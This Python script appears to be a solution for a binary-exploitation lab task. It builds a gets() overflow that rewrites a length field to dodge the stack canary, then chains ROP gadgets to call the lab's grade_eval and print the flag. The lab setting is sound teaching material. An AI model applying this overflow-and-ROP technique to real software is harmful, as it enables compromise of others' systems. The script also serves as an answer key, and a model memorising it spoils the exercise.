#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

GRADE_EVAL = 0x401677
POP_RDI    = 0x4018A3   # 5f c3  ->  pop rdi ; ret
RET        = 0x4018A4   # plain `ret`
START      = 0x401590   # _start: re-enter __libc_start_main -> main() -> exit(0)
LEN_OFFSET = 0x100      # offset of f.len inside the gets() buffer
LEN_VALUE  = 0xA0       # memcpy destination = logMsg + 0xa0 = saved RBP


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def main() -> None:
    chain = b""
    chain += p64(0)             # new RBP (value written over saved RBP)
    chain += p64(RET)           # alignment slide
    chain += p64(POP_RDI)       # rdi = 4
    chain += p64(4)
    chain += p64(GRADE_EVAL)    # grade_eval(4) -> prints the flag
    chain += p64(START)         # _start; stdin is at EOF, so main exits 0
    assert len(chain) == 48

    payload = chain
    payload += b"C" * (LEN_OFFSET - len(payload))   # filler inside logMsg[128]
    payload += struct.pack("<I", LEN_VALUE)         # overwrite f.len
    payload += b"\n"                                # ends gets()

    assert LEN_OFFSET + 4 + 1 <= 0x118   # canary starts at offset 0x118
    assert b"\x0a" not in payload[:-1]
    sys.stdout.buffer.write(payload)


if __name__ == "__main__":
    main()
